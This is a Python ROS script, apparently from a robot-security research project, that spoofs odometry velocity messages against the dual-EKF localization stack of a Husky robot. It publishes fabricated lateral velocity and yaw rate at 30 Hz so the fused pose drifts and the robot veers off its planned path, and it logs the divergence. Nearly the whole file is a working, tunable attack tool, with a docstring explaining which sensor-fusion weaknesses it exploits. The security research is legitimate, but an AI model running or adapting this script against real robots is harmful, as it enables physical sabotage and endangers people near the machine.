#!/usr/bin/env python3
"""WEAPONIZED odometry TWIST spoof against the map-frame dual-EKF stack.

  *** SIMULATION-ONLY SECURITY DEMONSTRATION. No real robot is involved. ***

This is the WEAPONIZED SIBLING of attack_odom.py. Where attack_odom.py is a
DELIBERATE NEGATIVE RESULT -- it reproduces the security report's literal
"impossible absolute pose" spoof and then MEASURES that the EKF silently drops
it, because the filter fuses velocity and ignores pose from this topic -- THIS
script does the attack the report SHOULD have described: it spoofs the TWIST
(velocity), which the EKF actually integrates into the fused position and
heading. attack_odom.py goes out of its way to NEUTRALIZE itself (it mirrors the
real yaw rate so its net effect on the fused vyaw is ~zero); this script does the
opposite -- it INJECTS a fabricated velocity. That un-neutralization IS the
attack.

TARGET (the DATASET goal-hijack robot; see RUN-GOAL-HIJACK.md)
-------------------------------------------------------------
move_base on that robot plans in the `map` frame off /odometry/filtered_map,
the output of the MAP-frame EKF (husky_control/config/localization_map.yaml).
That filter's world_frame is `map` and it fuses, from
husky_velocity_controller/odom:

    odom0_config: [false, false, false,      # x, y, z  pose   -> IGNORED
                   false, false, false,      # roll,pitch,yaw  -> IGNORED
                   true,  true,  true,       # vx, vy, vz      -> FUSED
                   false, false, true,       # v-roll,pitch,yaw-> vyaw FUSED
                   false, false, false]

i.e. it fuses vx, vy AND vyaw from this topic (localization_map.yaml lines
46-50). It also fuses imu/data (absolute yaw + yaw rate, DIFFERENTIAL) and
odometry/gps (ABSOLUTE x, y ONLY -- GPS has no yaw -- at ~2 Hz).

WHY THE TWIST SPOOF WORKS (and where it hits hardest)
-----------------------------------------------------
Between GPS position corrections the wheel-odometry VELOCITY on this topic is the
ONLY thing moving the fused pose. A lie about velocity is INTEGRATED into the
fused POSITION, so publishing a fast, large fake velocity drags the fused (x, y)
away faster than the correctors can pull it back. The two fields we inject hit
the estimates with the WEAKEST correctors:

  * twist.linear.y  (fake LATERAL velocity) -- THE key field. NOTHING in this
    filter measures lateral velocity absolutely: GPS supplies only absolute x/y
    and only at ~2 Hz, and the IMU measures acceleration/heading, not vy. So a
    fabricated vy integrates almost unopposed into fused (x, y), dragging the
    pose sideways off the planned path with the weakest corrector in the stack.

  * twist.angular.z (fake YAW RATE) -- integrated into the fused HEADING. Here
    the map EKF DOES fuse imu/data yaw DIFFERENTIALLY (imu0_differential: true),
    so the injected yaw rate is PARTIALLY FOUGHT by the IMU/compass. That is
    EXPECTED: heading corruption is contested, position corruption via vy is not.

  * twist.linear.x  (fake forward velocity) -- also fused, offered as a knob;
    default 0.0 so the derail is driven by the lateral/yaw lie, not a crude
    forward shove.

WE DO NOT SPOOF POSE. odom0_config ignores pose from this topic, so a fake pose
would be dropped (that is exactly the negative result attack_odom.py proves). We
leave pose at identity/zero and put the entire exploit in the twist.

WHAT THIS PRODUCES: A DERAIL, NOT A REDIRECT
--------------------------------------------
This corrupts the robot's BELIEF about where it is and which way it faces.
move_base still chases the OPERATOR'S REAL GOAL -- we publish NO rogue
/move_base/goal, we never touch the goal channel. The robot plans a path from a
CORRUPTED pose belief toward the genuine goal, so it VEERS OFF its planned path
(a derail). It is NOT redirected to an attacker-chosen destination. Consequence:
the attack is STEALTHY on goal telemetry (the goal stays clean) but VISIBLE in
/odometry/filtered_map -- the fused heading and position diverge from where the
robot actually is / should be.

FEEDBACK-LOOP HANDLING (self-publish + self-subscribe)
------------------------------------------------------
We both PUBLISH to and SUBSCRIBE from husky_velocity_controller/odom (the
subscribe is telemetry-only -- we never feed our own spoof back into the payload,
but we filter it for cleanliness/attribution). The genuine diff_drive controller
stamps child_frame_id = "base_link" (husky_control/config/control.yaml:16,
base_frame_id: base_link). Our spoofed messages instead carry
child_frame_id = SPOOF_CHILD_FRAME so we can tell our own traffic apart. This is
the same sentinel trick attack_odom.py uses -- but note the CRITICAL DIFFERENCE:
attack_odom.py uses the real stream to MIRROR (neutralize) the yaw rate; we do
NOT mirror anything. Our twist values are fabricated constants from argparse. The
subscriber here exists only to observe/attribute, never to source the payload.

TELEMETRY / PROOF (no ground truth -- hard project rule)
--------------------------------------------------------
We never read Gazebo ground truth. We log, once per second:

    * elapsed_time
    * the FUSED estimate from /odometry/filtered_map -- the MAP-frame EKF output
      that move_base plans on. THIS IS THE LOAD-BEARING SIGNAL: does the fused
      pose/heading diverge under the twist injection? We log fused x, y (map
      frame, metres) and fused yaw in degrees (derived from the quaternion).
    * an absolute REFERENCE read directly from /navsat/fix and converted to world
      metres by fix_to_world() (copied verbatim from attack_odom.py). This is an
      UNFUSED sensor reading logged for CONTEXT ONLY -- NOT ground truth. Note the
      frames differ: fused is MAP-frame metres; the fix reference is WORLD metres
      from the datum, so their difference is not itself a clean drift metric.
      Watch the fused columns for the derail; the ref columns are context.

CSV columns: elapsed_time, fused_x, fused_y, fused_yaw_deg, ref_x, ref_y. Opened
once, header written, flushed every row so a mid-run Ctrl-C leaves a complete
file.

CLEAN SHUTDOWN
--------------
On Ctrl-C or --duration expiry we simply STOP publishing. We do NOT emit a
corrective message: once our faster stream ceases, the honest diff_drive
controller's real velocity resumes dominating and the EKF re-anchors on GPS.

USAGE (examples)
----------------
    # Derail via lateral velocity + yaw rate at 30 Hz until Ctrl-C.
    python3 attack_odom_twist.py

    # Run 30 s, stronger lateral drag, log to a named CSV.
    python3 attack_odom_twist.py --vy 2.0 --wz 0.8 --duration 30 --csv derail.csv

This script was NOT run live end-to-end here. Topic/type/config wiring was
verified against the repo config files: husky_velocity_controller/odom is
nav_msgs/Odometry (control.yaml); the map EKF fuses vx/vy/vyaw from it and x/y
from GPS with no yaw (localization_map.yaml); base_frame_id is base_link
(control.yaml:16). /odometry/filtered_map and /navsat/fix are the map-EKF output
and GPS sensor respectively.
"""

import argparse
import csv
import math
import threading
import time

import rospy
from nav_msgs.msg import Odometry
from sensor_msgs.msg import NavSatFix


# ---------------------------------------------------------------------------
# Default fabricated TWIST payload. Kept as named constants so the CSV/banner
# can echo them and a reader sees the payload at a glance. These are the
# velocity LIES the EKF integrates into fused pose/heading.
# ---------------------------------------------------------------------------
SPOOF_VX = 0.0   # twist.linear.x  -- fake forward vel; 0 so the derail is the
                 #                    lateral/yaw lie, not a crude forward shove.
SPOOF_VY = 1.0   # twist.linear.y  -- fake LATERAL vel; THE key field. No
                 #                    absolute corrector (GPS 2 Hz x/y, IMU has
                 #                    no vy) -> integrates almost unopposed.
SPOOF_WZ = 0.5   # twist.angular.z -- fake YAW RATE (rad/s); fused into heading,
                 #                    partially fought by differential IMU yaw.

# Sentinel child_frame_id stamped on OUR spoofed messages so our own subscriber
# can tell them apart from the genuine controller's (which uses "base_link", per
# husky_control/config/control.yaml:16 base_frame_id). Used to attribute/filter
# our own traffic on the publish->subscribe loop. Unlike attack_odom.py we do
# NOT mirror the real stream into our payload -- the subscriber is telemetry-only.
SPOOF_CHILD_FRAME = "base_link_spoof"


# ---------------------------------------------------------------------------
# GPS -> WORLD metres conversion.
#
# COPIED VERBATIM from attack_odom.py (which replicated it from the driver) so
# the telemetry's reference lands in world metres. On this robot /navsat/fix is
# read only as an absolute sensor reference for context, NEVER as ground truth.
# (See drive_to_point_gps.py for the full provenance of every constant.)
# ---------------------------------------------------------------------------
REF_LAT = 49.9  # deg, <referenceLatitude>  in gps.urdf.xacro
REF_LON = 8.9   # deg, <referenceLongitude> in gps.urdf.xacro

EQUATORIAL_RADIUS = 6378137.0
FLATTENING = 1.0 / 298.257223563
E2 = 2.0 * FLATTENING - FLATTENING ** 2

_SIN2_REF_LAT = math.sin(math.radians(REF_LAT)) ** 2
RADIUS_NORTH = EQUATORIAL_RADIUS * (1.0 - E2) / (1.0 - E2 * _SIN2_REF_LAT) ** 1.5
RADIUS_EAST = (EQUATORIAL_RADIUS / math.sqrt(1.0 - E2 * _SIN2_REF_LAT)
               * math.cos(math.radians(REF_LAT)))

DEG_LAT_PER_METRE = math.degrees(1.0 / RADIUS_NORTH)
DEG_LON_PER_METRE = math.degrees(1.0 / RADIUS_EAST)


def fix_to_world(latitude, longitude):
    """Convert a geodetic fix to (world_x, world_y) in metres. Identical to the
    driver's conversion: world +x is NORTH, world +y is WEST (hence the minus
    on the longitude term)."""
    world_x = (latitude - REF_LAT) / DEG_LAT_PER_METRE
    world_y = -(longitude - REF_LON) / DEG_LON_PER_METRE
    return world_x, world_y


def yaw_from_quaternion(x, y, z, w):
    """Extract yaw (rad) from a quaternion. two_d_mode is on, so roll/pitch are
    ~0; this is the standard atan2 yaw for a planar orientation."""
    siny_cosp = 2.0 * (w * z + x * y)
    cosy_cosp = 1.0 - 2.0 * (y * y + z * z)
    return math.atan2(siny_cosp, cosy_cosp)


class OdomTwistSpoofAttack(object):
    def __init__(self, args):
        self.args = args
        self._lock = threading.Lock()
        # (x, y, yaw_deg) from /odometry/filtered_map -- MAP-frame fused output.
        self._fused = None
        self._ref_xy = None     # (x, y) from /navsat/fix via fix_to_world
        self._stop = threading.Event()
        self._start_wall = None

        # Publisher onto the SAME topic the real controller uses. queue_size=1:
        # always the freshest fake message, never a backlog.
        self._pub = rospy.Publisher(args.topic, Odometry, queue_size=1)

        # Telemetry subscribers. We only READ these; the attack is the publish.
        # /odometry/filtered_map is the MAP-frame EKF output move_base plans on
        # -- the load-bearing signal. /navsat/fix is the unfused GPS reference.
        rospy.Subscriber("/odometry/filtered_map", Odometry,
                         self._on_fused, queue_size=1)
        rospy.Subscriber("/navsat/fix", NavSatFix,
                         self._on_fix, queue_size=1)

        # Subscribe to the SAME topic we spoof, to observe/attribute traffic on
        # the self-publish loop. Unlike attack_odom.py we do NOT source any
        # payload value from here -- the spoofed twist is fabricated constants.
        # We still filter our own messages via SPOOF_CHILD_FRAME for cleanliness.
        rospy.Subscriber(args.topic, Odometry,
                         self._on_topic_odom, queue_size=1)

        # CSV: open once, write header, flush every row so a mid-run Ctrl-C
        # still leaves a complete, readable file.
        self._csv_file = open(args.csv, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow(
            ["elapsed_time", "fused_x", "fused_y", "fused_yaw_deg",
             "ref_x", "ref_y"])
        self._csv_file.flush()

    # --- telemetry callbacks -------------------------------------------------
    def _on_fused(self, msg):
        q = msg.pose.pose.orientation
        yaw_deg = math.degrees(yaw_from_quaternion(q.x, q.y, q.z, q.w))
        with self._lock:
            self._fused = (msg.pose.pose.position.x,
                           msg.pose.pose.position.y,
                           yaw_deg)

    def _on_fix(self, msg):
        # Guard against STATUS_NO_FIX / NaN sentinel fixes.
        if msg.status.status < 0:
            return
        if math.isnan(msg.latitude) or math.isnan(msg.longitude):
            return
        with self._lock:
            self._ref_xy = fix_to_world(msg.latitude, msg.longitude)

    def _on_topic_odom(self, msg):
        """Observe traffic on the spoofed topic. We see our OWN spoofed messages
        here (they carry SPOOF_CHILD_FRAME) alongside the genuine controller's
        ("base_link"). We source NOTHING for the payload from here -- unlike
        attack_odom.py, which mirrors the real yaw rate. Kept only so the loop is
        explicit and attributable; our own messages are ignored."""
        if msg.child_frame_id == SPOOF_CHILD_FRAME:
            return  # our own spoofed message -- nothing to do
        # Genuine controller message. No payload sourced from it (this is the
        # attack, not a neutralization). Intentionally a no-op beyond the filter.

    # --- the fabricated message ---------------------------------------------
    def _build_spoof(self):
        """Build one fake nav_msgs/Odometry carrying the fabricated TWIST. Pose
        is left at identity/zero on purpose: the map EKF ignores pose from this
        topic (odom0_config pose fields all false), so the entire exploit lives
        in the twist. Structurally valid (identity quaternion, proper frames and
        stamp)."""
        msg = Odometry()
        msg.header.stamp = rospy.Time.now()
        msg.header.frame_id = "odom"
        # Sentinel so our own subscriber can attribute/filter our traffic on the
        # self-publish loop. Genuine controller uses "base_link" (control.yaml).
        msg.child_frame_id = SPOOF_CHILD_FRAME

        # POSE -- left at zero with a valid identity quaternion. The EKF's
        # odom0_config ignores pose from this topic, so spoofing it is pointless
        # (that is precisely the negative result attack_odom.py proves). The
        # attack is entirely in the twist below.
        msg.pose.pose.orientation.w = 1.0  # valid identity quaternion

        # TWIST -- the fabricated velocity LIE the EKF integrates into fused
        # pose/heading. INJECTED constants, NOT mirrored from the real stream:
        #   linear.y  -> fake lateral vel; hits fused (x,y) with the weakest
        #                corrector (GPS 2 Hz x/y, IMU has no vy). The key field.
        #   angular.z -> fake yaw rate; fused into heading, partially fought by
        #                the differential IMU yaw (expected).
        #   linear.x  -> fake forward vel (default 0).
        msg.twist.twist.linear.x = self.args.vx
        msg.twist.twist.linear.y = self.args.vy
        msg.twist.twist.angular.z = self.args.wz
        return msg

    # --- telemetry row -------------------------------------------------------
    def _log_row(self):
        with self._lock:
            fused = self._fused
            ref = self._ref_xy
        elapsed = time.time() - self._start_wall

        if fused is None:
            rospy.loginfo(
                "[t=%6.1fs] waiting for /odometry/filtered_map ...", elapsed)
            return

        ref_x = ref[0] if ref else float("nan")
        ref_y = ref[1] if ref else float("nan")
        rospy.loginfo(
            "[t=%6.1fs] fused=(%8.3f,%8.3f) yaw=%7.2f deg  ref=(%8.2f,%8.2f)",
            elapsed, fused[0], fused[1], fused[2], ref_x, ref_y)
        self._csv.writerow(
            ["%.3f" % elapsed,
             "%.4f" % fused[0], "%.4f" % fused[1], "%.4f" % fused[2],
             "%.4f" % ref_x, "%.4f" % ref_y])
        self._csv_file.flush()

    # --- main loop -----------------------------------------------------------
    def run(self):
        self._start_wall = time.time()
        rate = rospy.Rate(self.args.rate)
        next_log = self._start_wall + 1.0  # first telemetry row after 1 s

        rospy.loginfo(
            "ATTACK START (twist spoof / DERAIL): spoofing %s at %.1f Hz with "
            "linear=(%.2f, %.2f) angular.z=%.2f%s",
            self.args.topic, self.args.rate,
            self.args.vx, self.args.vy, self.args.wz,
            (" for %.0f s" % self.args.duration)
            if self.args.duration > 0 else " until Ctrl-C")

        while not self._stop.is_set() and not rospy.is_shutdown():
            if self.args.duration > 0 and \
                    (time.time() - self._start_wall) >= self.args.duration:
                rospy.loginfo("Duration reached -- stopping.")
                break

            self._pub.publish(self._build_spoof())

            now = time.time()
            if now >= next_log:
                self._log_row()
                next_log += 1.0

            rate.sleep()

    def shutdown(self):
        """Stop publishing and close the CSV. Idempotent. NO corrective message
        is sent -- we just cease and let the real controller (and GPS) reassert
        the honest estimate."""
        self._stop.set()
        try:
            if not self._csv_file.closed:
                self._csv_file.flush()
                self._csv_file.close()
        except Exception as exc:  # noqa: BLE001 -- log, never hide
            rospy.logwarn("Error closing CSV: %s", exc)
        rospy.loginfo("ATTACK STOPPED. CSV saved to %s", self.args.csv)


def parse_args():
    p = argparse.ArgumentParser(
        description="Weaponized odometry TWIST spoof against the map-frame EKF "
                    "(fabricated lateral velocity + yaw rate -> pose DERAIL).")
    p.add_argument("--rate", type=float, default=30.0,
                   help="publish rate in Hz (default 30; out-rates the real "
                        "diff_drive controller on this topic)")
    p.add_argument("--duration", type=float, default=0.0,
                   help="seconds to run; 0 = until Ctrl-C (default 0)")
    p.add_argument("--topic", default="husky_velocity_controller/odom",
                   help="odometry topic to spoof "
                        "(default husky_velocity_controller/odom)")
    p.add_argument("--csv", default="attack_odom_twist_report.csv",
                   help="telemetry output CSV path "
                        "(default attack_odom_twist_report.csv)")
    # The fabricated twist payload. These ARE the attack -- injected, not mirrored.
    p.add_argument("--vx", type=float, default=SPOOF_VX,
                   help="fake twist linear.x, forward vel m/s (default 0.0)")
    p.add_argument("--vy", type=float, default=SPOOF_VY,
                   help="fake twist linear.y, LATERAL vel m/s -- the key field "
                        "(default 1.0)")
    p.add_argument("--wz", type=float, default=SPOOF_WZ,
                   help="fake twist angular.z, yaw rate rad/s (default 0.5)")
    args = p.parse_args()
    if args.rate <= 0:
        p.error("--rate must be > 0")
    return args


def main():
    args = parse_args()
    # anonymous=True: multiple attacker instances (or reruns) must not collide
    # on a node name.
    rospy.init_node("attack_odom_twist", anonymous=True)

    attack = OdomTwistSpoofAttack(args)
    rospy.on_shutdown(attack.shutdown)

    try:
        attack.run()
    except rospy.ROSInterruptException:
        pass
    finally:
        # on_shutdown may not fire on a clean duration exit -- ensure cleanup.
        attack.shutdown()


if __name__ == "__main__":
    main()
